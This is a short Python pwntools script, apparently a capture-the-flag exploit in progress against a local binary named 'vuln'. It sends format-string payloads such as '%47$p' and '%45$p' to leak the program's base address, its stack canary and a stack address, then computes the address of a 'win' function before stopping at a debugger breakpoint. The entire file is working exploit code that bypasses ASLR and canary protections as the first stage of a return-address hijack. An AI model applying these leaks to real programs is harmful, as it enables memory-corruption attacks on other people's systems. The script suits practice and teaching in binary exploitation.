import pwn
import pdb
process = pwn.process('./vuln')
process.sendline(b"%47$p")
# processing base addr by leaking ret to main addr - the instruction it points to in regular order
baseAddr = int(process.recvuntil(b'\n', drop=True), 16)
baseAddr -= 0x12ad
print("Base addr: " + str(hex(baseAddr)))

# canary value processing
process.clean()
process.sendline(b"%45$p")
canary = hex(int(process.recvuntil(b'\n', drop=True), 16))
print("Canary: " + str(canary))

# addr of ret addr
#pdb.set_trace()
process.clean()
process.sendline(b"%46$p")
startBuf = int(process.recvuntil(b'\n', drop=True), 16)
startBuf -= 24
startBuf = hex(startBuf)
print("RetAddr: " + str(startBuf))

# addr of win
win = hex(baseAddr+0x11c9)
print("Addrwin: " + str(win))

# addr of ret addr
pdb.set_trace()
